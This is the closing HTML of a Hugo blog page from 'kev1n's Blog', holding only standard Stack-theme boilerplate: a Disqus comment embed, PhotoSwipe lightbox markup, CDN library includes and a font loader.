<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//hugo-theme-stack.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
2020 -
2026 kev1n's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.33.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>